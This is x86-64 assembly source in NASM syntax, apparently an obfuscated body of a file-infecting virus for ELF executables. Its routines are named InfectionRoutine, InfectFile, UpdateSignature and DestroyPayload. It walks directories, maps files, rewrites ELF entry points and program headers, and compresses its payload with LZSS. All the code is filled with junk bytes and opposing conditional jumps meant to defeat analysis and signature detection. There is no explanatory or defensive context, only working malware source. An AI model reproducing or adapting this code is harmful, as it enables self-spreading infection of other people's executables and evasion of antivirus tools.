..@YHXfWFuC36to:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jl          ..@KcMIalbTPaej
    jge         ..@KcMIalbTPaej
..@HwR4sGyMGdEN:
    add         rsi, rdx
    jmp         $+4
db 0xcf, 0xd9
    jmp         $+5
db 0x08, 0x63, 0x69
    jmp         ..@veFse93Iv4EX
..@y01BFO49ezwE:
    xchg        rdx, rdx
    jmp         ..@AQGg0iTPPxl7
..@XiB83EIAezh2:
    push        rdx
    jmp         ..@QQSxhA2XeV0c
..@MOGOkWZpsqR4:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         ..@i9SDHyJs9MSJ
..@DM8jCA1IhA0P:
    call_vsp    Strncmp
    jmp         $+4
db 0x7a, 0xe9
    jmp         $+5
db 0x8b, 0xe9, 0x5a
    je          ..@pxcqRtizkz19
    jne         ..@pxcqRtizkz19
..@Bs796Tb1zrkU:
    je          ..@bFZPW1z368cQ
    jl          ..@9hYVunt5IlZK
    jge         ..@9hYVunt5IlZK
..@9V07tQUiRFjz:
    pop         rdx
    js          ..@mRj69eHbWi8M
    jns         ..@mRj69eHbWi8M
..@Jjf98p54Gjmp:
    mov         rsi, rsi
    jb          ..@qKua2uZfuGS3
    jae         ..@qKua2uZfuGS3
..@bG6G8XrKWJeJ:
    call        UpdateSignature
    jmp         ..@SWCnLWg9H83q
..@lSmxAodmoz9j:
    cmp         rax, 0xffffffffffffffff
    js          ..@BWS41xMeqWLQ
    jns         ..@BWS41xMeqWLQ
..@dmZR0TIm6lsz:
    xchg        rax, rax
    jmp         $+5
db 0xa1, 0x2c, 0xce
    js          ..@CtBCFDEbAYLG
    jns         ..@CtBCFDEbAYLG
..@2zwP3AhFZS3I:
    push        rdi
    jmp         ..@79FTwrNlB4mw
..@BRR5Balhd9SC:
    mov         rbx, rbx
    jmp         ..@xgsMEQHHnPUY
..@nqBKrp4fghKv:
    add         rsp, _INFFILE_OFF_size
    jmp         $+4
db 0xd2, 0x8d
    jb          ..@uabgFRn2FwL4
    jae         ..@uabgFRn2FwL4
..@CrYbw5GAppvD:
    call        InfectFile
    jl          ..@0mrFqDe6RyTX
    jge         ..@0mrFqDe6RyTX
..@aZpypC93L3pe:
    push        rsi
    jmp         $+3
db 0xbf
    jb          ..@O49Pbpr0Xf6i
    jae         ..@O49Pbpr0Xf6i
..@VL4CrQiC56hA:
    xchg        rax, rax
    jmp         $+5
db 0xad, 0x01, 0x04
    jmp         $+3
db 0x72
    jmp         $+5
db 0x2b, 0x3d, 0x17
    jmp         $+5
db 0x05, 0xfd, 0x5f
    jb          ..@YxLglOO0djF4
    jae         ..@YxLglOO0djF4
..@gjbeQloMukOt:
    mov         rbx, rbx
    jmp         $+3
db 0xd0
    jmp         ..@4ynjNk9gOOY1
..@JCRSmiJ7NoDu:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+4
db 0x87, 0xe6
    jmp         $+3
db 0x86
    jmp         $+3
db 0x6c
    jl          ..@fVqxoeSl8LAw
    jge         ..@fVqxoeSl8LAw
..@4y45455XDfs2:
    mov         r2, QWORD [r1+e_h.e_phoff]
    jmp         $+3
db 0x3c
    je          ..@y39vSGSFD2yn
    jne         ..@y39vSGSFD2yn
..@7Fl5OZar8Xtf:
    call_vsp    GetEnv
    jl          ..@NmZDT9l3M2OA
    jge         ..@NmZDT9l3M2OA
..@2G4kc1XMKJ6F:
    mov         rdi, rdi
    jmp         $+3
db 0x22
    jmp         ..@QwEwu4ol0ADi
..@kgb4HcspMr9X:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jl          ..@vdPrPQYJnypt
    jge         ..@vdPrPQYJnypt
..@oNmfs7nr93Wy:
    jl          ..@ozVpxELDkzia
    jmp         ..@8R69D88mMxcJ
..@2ud411gln7GX:
    xor         rcx, rcx
    jmp         $+5
db 0x0b, 0x62, 0x25
    je          ..@uUOWKu2pyskk
    jne         ..@uUOWKu2pyskk
..@DOAv021NwryU:
    xchg        rcx, rcx
    jmp         ..@2LPaJrWgwFpW
..@TU1uCgfRRMw6:
    xchg        rdx, rdx
    jmp         $+3
db 0x86
    jmp         ..@48OTMUrC9ZHt
..@jMPshAioBELd:
    pop         rdi
    jmp         $+3
db 0xff
    jb          ..@EbAncEZeLtaP
    jae         ..@EbAncEZeLtaP
..@B6l11FuiIVCS:
    mov         QWORD [r5+file.filesize], rax
    jmp         ..@MCcmxj5ldlIA
..@Rdl3DdTSiFRk:
    mov         rcx, rcx
    js          ..@tOip3lqnDL6c
    jns         ..@tOip3lqnDL6c
..@i9SDHyJs9MSJ:
    xchg        rdi, rdi
    jmp         $+4
db 0x25, 0x11
    jmp         $+5
db 0x3e, 0xee, 0x8e
    jmp         $+5
db 0x4d, 0x73, 0xd1
    jb          ..@RSVCoa0ByGXh
    jae         ..@RSVCoa0ByGXh
..@3tw1PGwPeSiC:
    rep         stosb
    js          ..@hhwN9DYE2lrp
    jns         ..@hhwN9DYE2lrp
..@H3Umd2qe8HCn:
    xchg        rsp, rsp
    jmp         ..@K6o0hD2GoJdl
..@xAbwbUlc96O0:
    pop         rsi
    jl          ..@AohgAjZuJoK1
    jge         ..@AohgAjZuJoK1
..@kqVMsVI9lciR:
    mov         DWORD [rdi], eax
    jmp         $+5
db 0x54, 0x6b, 0x13
    jmp         ..@Gv4vauugMfhD
..@7POBsMdV627i:
    mov         rbp, rbp
    jmp         $+5
db 0x51, 0xd0, 0xc8
    js          ..@j4W02HAyb04s
    jns         ..@j4W02HAyb04s
..@sIGjlHk882MO:
    mov         rbp, rbp
    jmp         $+5
db 0x82, 0x93, 0x48
    jmp         $+4
db 0x88, 0x3f
    jmp         ..@ToBZYMgeeWPM
..@hsqZUyXiP5iL:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jl          ..@xnkWZN5OwvzW
    jge         ..@xnkWZN5OwvzW
..@gZkX4BKqwQnr:
    syscall
    jb          ..@CADrYX6CWpn4
    jae         ..@CADrYX6CWpn4
..@yZXlCreiju6L:
    pop         rdi
    jb          ..@tdvKETiBhnoG
    jae         ..@tdvKETiBhnoG
..@F7my4gxzyh30:
    mov         rdx, rdx
    jmp         $+4
db 0x06, 0xd9
    je          ..@mSXJQdtv59IT
    jne         ..@mSXJQdtv59IT
..@aRbsvU3eIWck:
    rep         cmpsb
    jmp         $+5
db 0xd5, 0x5c, 0xf5
    js          ..@Dy8ZXJWFYmrr
    jns         ..@Dy8ZXJWFYmrr
WORDToDWORDASCII:
    jmp         ..@ekkbhmqL1hgB
..@8Y8684h13CIs:
    mov         rdi, m6
    jmp         $+5
db 0x2b, 0x49, 0x2f
    je          ..@UBOfCf6D9b4p
    jne         ..@UBOfCf6D9b4p
..@1HV4s4fiPC2L:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+4
db 0xcd, 0x3f
    jmp         $+3
db 0x9a
    jmp         ..@Tbz2cSIYIMIE
..@zCs21D0IeKmr:
    mov         r1, m6
    jmp         $+5
db 0x53, 0x93, 0xfc
    jl          ..@5q4SIXrB3FVP
    jge         ..@5q4SIXrB3FVP
..@ZZCW5mweWZeE:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         $+3
db 0x60
    jb          ..@oJp5vgvFy9NO
    jae         ..@oJp5vgvFy9NO
..@OgrfBCadxDA9:
    pop         rax
    jmp         ..@1FW0xHKSdru7
..@eeD7TKy25Tau:
    mov         BYTE [r1], 0x00
    jmp         ..@RxP2S6kerB9i
..@IPj5KVcHhk6N:
    xchg        rdx, rdx
    jmp         $+3
db 0xfe
    js          ..@uZywK0jcOQgi
    jns         ..@uZywK0jcOQgi
..@D464T8miEWI6:
    mov         rdx, rdx
    jmp         $+3
db 0x93
    jmp         $+5
db 0xc6, 0xab, 0x4c
    jmp         ..@MedpIo9TrEVK
..@XR2CHXemCWQJ:
    pop         rbx
    js          ..@ceGimLVtZDWG
    jns         ..@ceGimLVtZDWG
..@IVgXqamCtmd7:
    pop         rax
    jl          ..@L3v1qtTv5pQP
    jge         ..@L3v1qtTv5pQP
..@y5sAyjLu36I3:
    ret
    jmp         $+5
db 0xe1, 0xe9, 0x4d
    jmp         $+3
db 0x40
    jb          ..@F5BGh4u7Ot4j
    jae         ..@F5BGh4u7Ot4j
..@pZx9uHLDSUm4:
    xor         rax, rax
    jmp         $+3
db 0x5e
    jl          ..@bR5Lqxu3xid3
    jge         ..@bR5Lqxu3xid3
..@w9nwSKEz6ICK:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    jmp         $+3
db 0x4b
    jmp         ..@jEzMGlcWbNlc
..@fD9WjIIwLG6V:
%ifdef X86_32
    push        rax
%endif
    je          ..@eb56cnEFad9c
    jne         ..@eb56cnEFad9c
..@h5dUAt2CPk9L:
    cmp         eax, 0x0
    jmp         $+4
db 0x18, 0x4d
    jl          ..@qwiXY54JiRzd
    jge         ..@qwiXY54JiRzd
..@F8tmJLGX3XfR:
    push        rcx
    jmp         $+5
db 0x03, 0xb0, 0xef
    js          ..@Oko6D5qWq2iH
    jns         ..@Oko6D5qWq2iH
..@xG7fYYBfbytI:
    pop         rsi
    jb          ..@yZXlCreiju6L
    jae         ..@yZXlCreiju6L
..@kYuIHxArnhs7:
    call        UnmapFile
    js          ..@nqBKrp4fghKv
    jns         ..@nqBKrp4fghKv
..@hpaDa8q2bsRD:
    pop         rdx
    jmp         $+4
db 0x4c, 0x68
    jmp         ..@ba14y4TcSfOQ
..@ZlUU8UGgo7Us:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+4
db 0x5c, 0x13
    jmp         $+5
db 0x37, 0xeb, 0xaf
    jmp         ..@XfAwFv0iBBw3
..@Tf62rLKYjqFx:
    mov         BYTE [rdi], al
    jmp         $+5
db 0x79, 0x5c, 0x7d
    jmp         ..@EBq6a6ZTYgmW
..@f0ShLUrT3drC:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    jmp         ..@a8ExULZHrPs1
..@C2U9GmmmEEPc:
    mov         rdi, rdi
    jmp         $+5
db 0x6b, 0x0d, 0x4d
    js          ..@GUChKJWs5TPs
    jns         ..@GUChKJWs5TPs
InfectionRoutine:
    jmp         ..@KKBysziAQEWH
..@Ma8u04jb0lFH:
    add         rsi, rcx
    jmp         ..@i5YuPeckps0a
..@wMiO9PO9FGGk:
    mov         rax, QWORD [rsi+rcx+bytes]
    jb          ..@GTcGvY7AuEYl
    jae         ..@GTcGvY7AuEYl
..@aCnwoDXLmS7t:
    xor         rbx, rbx
    jmp         $+4
db 0x09, 0xb2
    jb          ..@4MUZWbGEmQ9C
    jae         ..@4MUZWbGEmQ9C
..@xo2MTa8Lz1kt:
    jmp         ..@b57s9zdrznFN
    jmp         ..@RPx5fR2AY44R
..@80M9GAdayfJT:
    ret
    jmp         $+4
db 0xbc, 0xf4
    jmp         $+4
db 0xac, 0x34
    jb          MapFile
    jae         MapFile
..@65nGg0gHpfKv:
    push        rdi
    jmp         ..@VsFQd1ZcRbYO
..@a24GuiAlFypc:
    cmp         r2, 0
    jmp         ..@4KX0nd8vV9Rk
..@4fdrLYM6EaM1:
    push        rcx
    jmp         $+3
db 0x12
    jmp         $+4
db 0x4a, 0xa6
    jb          ..@vCclZPPYsh0X
    jae         ..@vCclZPPYsh0X
..@iGRM67sKCXrw:
    xor         r2, r2
    jmp         $+4
db 0x03, 0x13
    jmp         ..@yP5Aq4XwxjCZ
..@Db68AV2YBKBO:
    pop         rax
    jmp         ..@BvKmJhzsxz1H
..@tJu15J9cBbft:
    cmp         QWORD m7, 0x00
    jmp         $+3
db 0x9b
    je          ..@fme121zSWGc2
    jne         ..@fme121zSWGc2
..@CjfhVbOPgpfg:
    mov         rsi, rdi
    jmp         $+4
db 0xbd, 0x6e
    jb          ..@tDzqZLGPStC3
    jae         ..@tDzqZLGPStC3
..@xuFQbdPDFcJj:
    pop         rax
    jl          ..@uHj0lHuAEHDe
    jge         ..@uHj0lHuAEHDe
..@YiDwDIlEsyzP:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jmp         $+5
db 0xec, 0xe8, 0x76
    jmp         ..@cRCzzpxXOmun
..@8ijYYX7HYMeZ:
    push        rax
    jmp         ..@ehzq6NOy3cM5
..@xIF1poiXlTSU:
    mov         rbp, rbp
    js          ..@j0Tr7Ou9PnQn
    jns         ..@j0Tr7Ou9PnQn
..@uKqWglBrsOG4:
    push        rbx
    jl          ..@OfnmrpqErvxQ
    jge         ..@OfnmrpqErvxQ
..@qKua2uZfuGS3:
    pop         rbx
    jmp         ..@uIVgVGdpxGw6
..@QaVsj82wrnKi:
    xchg        rbx, rbx
    js          ..@5q3an9tnjKjW
    jns         ..@5q3an9tnjKjW
..@kOuxVi4ACxi0:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    je          ..@rJh8OHsK2rtK
    jne         ..@rJh8OHsK2rtK
..@9LVhT36zfxnk:
    xchg        rsp, rsp
    jmp         ..@6unfcD7hSnwf
..@TrM183CIJA3L:
    pop         r2
    jmp         ..@foVNd5ZSVVf6
..@WEqknAaB5QUc:
    mov         r2, rax
    js          ..@7xjPe4gkU8Py
    jns         ..@7xjPe4gkU8Py
..@ZFCG9Gb0tWL7:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    jl          ..@z3Ihp4vA3o3y
    jge         ..@z3Ihp4vA3o3y
..@7ngu8yWk1kKl:
    pop         rcx
    jmp         $+3
db 0x75
    jb          MemMove
    jae         MemMove
..@33jfHwSGQlDv:
    cmp         BYTE [r5], DT_DIR
    je          ..@nrxTsqBvssY9
    jne         ..@nrxTsqBvssY9
..@sR8LyWSdyFs4:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@Tf62rLKYjqFx
..@xr75ocXBkvfM:
    ret
    jmp         ..@vjuTXntxw1m1
..@WURfN47aQq9p:
    pop         rbx
    jmp         $+3
db 0x80
    jb          ..@alxXp5ZiUAdx
    jae         ..@alxXp5ZiUAdx
..@xiFNswhrowgA:
    push        rsi
    jmp         $+5
db 0x09, 0xf1, 0xb6
    jb          ..@FsueejrGQZqA
    jae         ..@FsueejrGQZqA
..@FsKdCvsGsPAE:
    pop         rdi
    jmp         $+3
db 0x69
    jl          ..@bgKNzL9mkQT3
    jge         ..@bgKNzL9mkQT3
..@qandh8udSc0c:
    test        eax, eax
    jmp         ..@0MjFcyxsPY9I
..@VsFQd1ZcRbYO:
    push        rsi
    jmp         ..@xG7fYYBfbytI
..@sYCoCUnQDlvQ:
%ifdef X86_64
    mov         edx, 111b ; TODO: reset to 11b
%endif
    jb          ..@x8CpnVExQOVa
    jae         ..@x8CpnVExQOVa
..@xUfu35yEkeu5:
    jne         ..@TxZjXiXyzd4c
    jb          ..@PwsaXDPvYyUw
    jae         ..@PwsaXDPvYyUw
..@6IFg2XmEFELc:
    xor         rax, rax
    jmp         $+4
db 0xa4, 0x68
    jmp         $+3
db 0x6d
    jmp         ..@6KqL54dDORNC
..@9hYVunt5IlZK:
    push        r1
    js          ..@Vad5tkB4aGEe
    jns         ..@Vad5tkB4aGEe
..@O49Pbpr0Xf6i:
    pop         rsi
    jmp         $+5
db 0x7e, 0x4e, 0xa4
    jl          ..@kuEZuvoVSdRI
    jge         ..@kuEZuvoVSdRI
..@Olc7dqc1weq8:
    mov         rax, [r5+file.filesize]
    js          ..@acIGzO7Fc1pP
    jns         ..@acIGzO7Fc1pP
..@1TJSgrT9je3l:
    jmp         ..@7y4SlUkcEshx
    jmp         ..@4fdrLYM6EaM1
..@H6CRGFfvzZKm:
    jnz         ..@JUEP3gNe55yH
    jmp         $+5
db 0x8c, 0xae, 0x79
    js          ..@mOdmqmcFAdFR
    jns         ..@mOdmqmcFAdFR
..@VMb11VYJLNp8:
    pop         r2
    jmp         $+5
db 0x57, 0x3a, 0xc4
    js          ..@9dhWxsDOTGAG
    jns         ..@9dhWxsDOTGAG
..@A9NSw0wljD3o:
    pop         rcx
    jl          ..@wgPTwBxetdP2
    jge         ..@wgPTwBxetdP2
..@GzFYnYZQQtnJ:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         ..@ZSAPiurRSrJ3
..@GjzVDEFnsgJP:
%ifdef X86_64
    push        rdi
%endif
    jmp         $+4
db 0x4e, 0x3d
    jmp         $+5
db 0x1c, 0x76, 0x44
    jmp         ..@AwBaAAJY4QmG
..@pWVVyDchoFfO:
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    jmp         ..@XiB83EIAezh2
..@D8FRE0PlQE16:
    mov         rsi, rsi
    jmp         ..@O44jZglxIL0i
..@uorQbr6lB0qL:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+5
db 0xcf, 0x39, 0x22
    jmp         $+5
db 0x2c, 0xe3, 0x70
    jmp         ..@VOxFmSdskIMo
..@V8bLoJC9yR7X:
    pop         rsi
    je          ..@myclczyxILQN
    jne         ..@myclczyxILQN
..@vzVGoKvWC2JR:
    pop         rbx
    jmp         ..@1UUtf6BjdyZ3
..@baSTBrVIEt7l:
    push        rbx
    jmp         $+3
db 0x50
    jl          ..@GISnpaELbSZq
    jge         ..@GISnpaELbSZq
..@ecJ5QFUwcaZB:
    cmp         rax, (-1)
    jb          ..@Z1B7Ze6ypEq2
    jae         ..@Z1B7Ze6ypEq2
..@ZEBbHMB8TLfa:
    pop         rdx
    je          ..@4u68uGeA4KX6
    jne         ..@4u68uGeA4KX6
..@jX8aajT2UqVp:
    test        ax, ax
    jmp         $+5
db 0xe1, 0xf7, 0x63
    je          ..@YjwZcchUX1Bn
    jne         ..@YjwZcchUX1Bn
..@RwwIAymFx3Af:
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jl          ..@7jtyhlFhTVXk
    jge         ..@7jtyhlFhTVXk
..@RpVVLk3ho9Ia:
%ifdef X86_64
    pop         rcx
%endif
    jmp         $+3
db 0x0a
    jmp         $+5
db 0xa4, 0xd7, 0x34
    js          ..@KISbk5I15ixW
    jns         ..@KISbk5I15ixW
..@7JchInMd9NeI:
    mov         rbp, rbp
    jmp         $+5
db 0xc3, 0x6c, 0x17
    jb          ..@0sTS74Gqb3iB
    jae         ..@0sTS74Gqb3iB
..@c3B9pYrorR1k:
    xchg        rdi, rdi
    jmp         $+3
db 0xe0
    jmp         ..@E8mcsleMiRJz
..@TC27eD5Y2DZj:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         ..@y7AitoRU2LXI
..@zGseY6CCO5fo:
    pop         rbx
    jmp         $+5
db 0x00, 0x40, 0x96
    js          ..@6oDd2b0HHz0F
    jns         ..@6oDd2b0HHz0F
..@dtf4mPobASsh:
    push        rax
    jmp         ..@xPJPTCNz3jCb
..@IQL87N8cP2Xt:
    push        r3
    jb          ..@cxU7csbqfmWy
    jae         ..@cxU7csbqfmWy
..@7ZmQAwG2PO7b:
    xchg        rsp, rsp
    jl          ..@mXsbCmo7BcVG
    jge         ..@mXsbCmo7BcVG
..@THBEs9GO0xgg:
    xor         rdx, rdx
    js          ..@ZlUU8UGgo7Us
    jns         ..@ZlUU8UGgo7Us
..@i4cNDjDorhkg:
    xchg        rax, rax
    je          ..@MoQmJQgrqll3
    jne         ..@MoQmJQgrqll3
..@9ZiS6ICJFIqk:
    xchg        rsi, rsi
    jmp         $+5
db 0xb6, 0xf9, 0xdb
    jl          ..@cN0A7p0InKfs
    jge         ..@cN0A7p0InKfs
..@kbK9ZCj3pigF:
%ifdef X86_64
    push        rcx
%endif
    jmp         $+5
db 0xb7, 0xb0, 0xb5
    js          ..@dkafykTi7Drq
    jns         ..@dkafykTi7Drq
..@hWfdks39yCdr:
    push        rbx
    js          ..@jk10u3qGBQeo
    jns         ..@jk10u3qGBQeo
..@vQcwT4PZwEId:
    mov         rdi, rdi
    jl          ..@WURfN47aQq9p
    jge         ..@WURfN47aQq9p
..@xQxMNP39BQ1M:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    js          ..@OCWEn89Tyuis
    jns         ..@OCWEn89Tyuis
..@ucNgKaIMXCla:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    js          ..@KQprtr7yyNSu
    jns         ..@KQprtr7yyNSu
..@8STp6KTopbMP:
    jz          ..@17OGrr8UvBiY
    jmp         $+3
db 0x11
    jmp         $+5
db 0x67, 0x44, 0xb6
    je          ..@LpPnfucCbYjC
    jne         ..@LpPnfucCbYjC
..@Gob62P6bVexR:
    pop         rdi
    jmp         ..@DxBnvS7E3dT0
..@YEpqwQNVfXmm:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    js          ..@oNmfs7nr93Wy
    jns         ..@oNmfs7nr93Wy
..@GISnpaELbSZq:
    pop         rbx
    jmp         $+3
db 0x74
    js          ..@fc2Z3dQcDq3M
    jns         ..@fc2Z3dQcDq3M
..@tPSp7QJKFdCE:
    mov         al, r2b
    je          ..@zLIT26btdv3h
    jne         ..@zLIT26btdv3h
..@KcMIalbTPaej:
    mov         rdi, rdi
    jmp         ..@OiNPoEE6rYMP
..@P6WCig3HGEmJ:
%ifdef X86_32
    mov         edx, 111b
%endif
    jmp         $+5
db 0xa7, 0xb3, 0x50
    jmp         ..@0ivUFZj4tY9m
..@Ulg4LGDuHNzp:
    mov         m6, rax
    js          ..@16nqIbtrJGlx
    jns         ..@16nqIbtrJGlx
..@3H2Y1Cx2R8sq:
    push        rcx
    jmp         $+4
db 0x32, 0x51
    jmp         $+5
db 0xaf, 0x09, 0x4b
    jmp         ..@M7Y8YWdcu0xA
..@V4KKFvqwNq0c:
    push        rbx
    jmp         $+4
db 0x3a, 0xc4
    jl          ..@qJUvkpzqnrdj
    jge         ..@qJUvkpzqnrdj
..@6ERyQxjHYUuD:
    mov         rax, rax
    jl          ..@Laci6jzCvQ8M
    jge         ..@Laci6jzCvQ8M
..@blO6OJT6QbvM:
    rep         nop
    jmp         $+3
db 0x4c
    js          ..@VZrjkpfJa1Qy
    jns         ..@VZrjkpfJa1Qy
..@MHXeF6UAWUm7:
    xor         rax, rax
    jmp         ..@sDGkrlI3pxb8
..@veINSrQhT0bQ:
    pop         rsi
    jmp         $+4
db 0x57, 0xf9
    jl          ..@BcTCqPBtEex6
    jge         ..@BcTCqPBtEex6
..@rUaoFe7tly9z:
    sub         rsp, _VADDR_OFF_size
    jmp         $+5
db 0xfc, 0x11, 0xca
    jmp         ..@ihaQDXWAycb6
..@Hwbwsw8sHOuh:
    xchg        rax, rax
    jmp         ..@DOXrBRsu6Xbi
..@wGTbIfFnv5Hh:
    mov         rcx, rcx
    jmp         $+5
db 0x9b, 0xec, 0x39
    jmp         $+5
db 0x0f, 0xc4, 0xc5
    jmp         ..@6lxjuSSxfcBT
..@P7uoaDP1ojml:
    push        rbx
    je          ..@uiUgz07HViTL
    jne         ..@uiUgz07HViTL
..@VoGYGeQlZ1ke:
    xchg        rax, rax
    jmp         $+3
db 0xe0
    jb          ..@CgtQ7ItJR7jm
    jae         ..@CgtQ7ItJR7jm
..@l5gACJY1DpuF:
    pop         rdi
    js          ..@QqV2t0LyOjSe
    jns         ..@QqV2t0LyOjSe
..@awCLuiENF57z:
    xchg        rsi, rsi
    jmp         $+5
db 0xea, 0x26, 0x60
    js          ..@ukJSlhP6WSpz
    jns         ..@ukJSlhP6WSpz
..@iCMICcFxB6zm:
    mov         QWORD [r1+e_h.e_entry], r3
    jb          ..@JtcNLxkiYYAT
    jae         ..@JtcNLxkiYYAT
..@MxjeCsc4CxyG:
    pop         rax
    js          ..@DLd4k78dCAX7
    jns         ..@DLd4k78dCAX7
AddSizeMappedFile:
    jmp         ..@NqhXwh1ieYeS
..@diqYNkLyKzLr:
    mov         rbx, rbx
    jl          ..@ItaSIuHR6K1q
    jge         ..@ItaSIuHR6K1q
..@jXJpeEqjAuBw:
    and         eax, 0xff
    jl          ..@xwdLr58YcPME
    jge         ..@xwdLr58YcPME
..@ok8lQ8Pr7kj8:
%ifdef X86_64
    push        rbx
%endif
    jmp         $+4
db 0x10, 0x5d
    jl          ..@wvkYACNsCi2h
    jge         ..@wvkYACNsCi2h
..@10RRFUI0i2th:
    sub         r5, 1
    js          ..@33jfHwSGQlDv
    jns         ..@33jfHwSGQlDv
..@IiU5kjAgty7E:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jb          ..@i9QLTNx3Mrz9
    jae         ..@i9QLTNx3Mrz9
..@K6ayrxfgfSg2:
    cmp         r1, e_h_size
    jb          ..@CJ2wd4f8vEK6
    jae         ..@CJ2wd4f8vEK6
..@i9QLTNx3Mrz9:
%ifdef X86_64
    xor         rdi, rdi
%endif
    jmp         $+4
db 0x99, 0x02
    jmp         $+4
db 0xb3, 0x99
    jl          ..@CrWMDKvU0NZi
    jge         ..@CrWMDKvU0NZi
..@f8BoGsrEvq8o:
    call        DestroyPayload
    jmp         $+3
db 0x9e
    jmp         $+3
db 0xfc
    jmp         $+3
db 0x4e
    jl          ..@jO5fGnCutNi9
    jge         ..@jO5fGnCutNi9
..@rtBsNNmHuq14:
    xchg        rdx, rdx
    jmp         ..@hz6aX6bNUxrt
..@fH1aOQWbmeVm:
    mov         rbp, rbp
    jmp         $+5
db 0x23, 0x04, 0x10
    jmp         $+3
db 0xd9
    js          ..@fUAbL65MRSwj
    jns         ..@fUAbL65MRSwj
..@GUChKJWs5TPs:
    je          ..@kvxyBBVN23xy
    jb          ..@Xxa15DwHFROT
    jae         ..@Xxa15DwHFROT
..@NsdtMV6xIt1h:
    add         rcx, 2*bytes
    js          ..@fg4o1eYME83K
    jns         ..@fg4o1eYME83K
..@UbDjBIzo5qQc:
    sub         rsi, 1
    jmp         $+3
db 0xdf
    jmp         ..@wKo6lvgrczj9
..@AsHzI44KEp9c:
    mov         rbx, rbx
    je          ..@GAUsH3wgeL0J
    jne         ..@GAUsH3wgeL0J
..@z6nrhm1iR3uJ:
%ifdef X86_64
    syscall
%endif
    jmp         $+3
db 0x4e
    jmp         $+3
db 0x6a
    jmp         $+5
db 0x9c, 0x6d, 0x2d
    js          ..@eP6nEUZVSYdp
    jns         ..@eP6nEUZVSYdp
..@Qd3sFNZa6XYN:
    mov         rcx, m7
    jmp         ..@3vFP8mbsyDqy
..@N4wkCdXyrdva:
    call        NonBinaryFile
    jmp         $+4
db 0x14, 0x87
    jmp         $+3
db 0x47
    jl          ..@xQqE0xsRentq
    jge         ..@xQqE0xsRentq
..@L9Y8FZp9hS4B:
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+5
db 0x44, 0x3d, 0xae
    jmp         $+3
db 0x1a
    jmp         ..@XrrNJt69BW35
..@cDaickq7mmCh:
    xor         rbx, rbx
    jmp         ..@v4c59wrp7Ccw
..@qK5KPdD3pZhz:
    mov         [r1], rax
    jl          ..@VdPWR4Tn0Ce6
    jge         ..@VdPWR4Tn0Ce6
..@H3BiBEuu9tU2:
    xchg        rcx, rcx
    jl          ..@KUsqIud2R7Xe
    jge         ..@KUsqIud2R7Xe
..@4ynjNk9gOOY1:
    push        rdx
    jmp         $+3
db 0x7e
    jmp         $+4
db 0xa2, 0x57
    jl          ..@zucue1lgxYPK
    jge         ..@zucue1lgxYPK
..@yAnTNm2DdMxe:
%ifdef X86_32
    pop         rbx
%endif
    jmp         ..@c1twnLtMCMqZ
..@EPnolf7zOpew:
    cmp         ax, LOOKAHEAD_LENGTH
    jb          ..@qKh1nrsQmhFb
    jae         ..@qKh1nrsQmhFb
..@1oKWoeKW1kr8:
    pop         rdx
    jmp         $+4
db 0xca, 0x27
    jb          ..@vs2loaUBZvcx
    jae         ..@vs2loaUBZvcx
..@zTuOqoSuuqLE:
    xchg        rcx, rcx
    jmp         ..@JCRSmiJ7NoDu
..@RyaVC0l8quEd:
    push        rax
    jl          ..@V51PmIuDHShR
    jge         ..@V51PmIuDHShR
..@ncwfqF4ZbmI6:
    mov         rsi, rsi
    jmp         $+3
db 0x18
    js          ..@EjR7NszFEnEK
    jns         ..@EjR7NszFEnEK
..@bCg29lnUyAzg:
    jbe         ..@4ynjNk9gOOY1
    js          ..@wuJk8hMLqFUF
    jns         ..@wuJk8hMLqFUF
..@lZn0AOVgqsa7:
    cmp         BYTE [r1], '.'
    jmp         $+5
db 0xc5, 0x40, 0x1b
    jmp         ..@F4Du2CIo8VKv
..@UBOfCf6D9b4p:
    add         rdi, non_packed_len
    jmp         $+4
db 0x8e, 0xa3
    jl          ..@hFWKB5MIbUOh
    jge         ..@hFWKB5MIbUOh
..@bOGi5QhGqlAr:
    add         rsp, _UPDATASIG_OFF_size
    jmp         ..@ZVAHtMa8VWmF
..@5Ry7tKTQj69w:
    je          ..@IPj5KVcHhk6N
    jb          ..@rUMnKfxAtmdS
    jae         ..@rUMnKfxAtmdS
..@kkF7Dl5tTRhW:
    push        rsi
    jmp         $+4
db 0x73, 0x38
    jmp         $+5
db 0x79, 0x84, 0x16
    jmp         $+3
db 0x8a
    jl          ..@6yGoyZOiUXB6
    jge         ..@6yGoyZOiUXB6
..@gP37al15isfu:
    mov         rbp, rbp
    jmp         ..@tXq6O6XxwT69
..@HO6Oqe42n8NI:
    pop         rcx
    jl          ..@wMiO9PO9FGGk
    jge         ..@wMiO9PO9FGGk
..@Zjf2kHfcHcts:
%ifdef X86_32
    push        rsi
%endif
    jmp         $+5
db 0x58, 0x39, 0xb3
    jmp         $+4
db 0xfa, 0xad
    jmp         ..@MHDASIj8pdCt
..@sek7mlPbnsOD:
    pop         rax
    jmp         $+3
db 0xc2
    js          ..@TU1uCgfRRMw6
    jns         ..@TU1uCgfRRMw6
..@XsS5j59lOIMy:
    mov         rbp, rbp
    jmp         ..@RXHAWeqBFZ9h
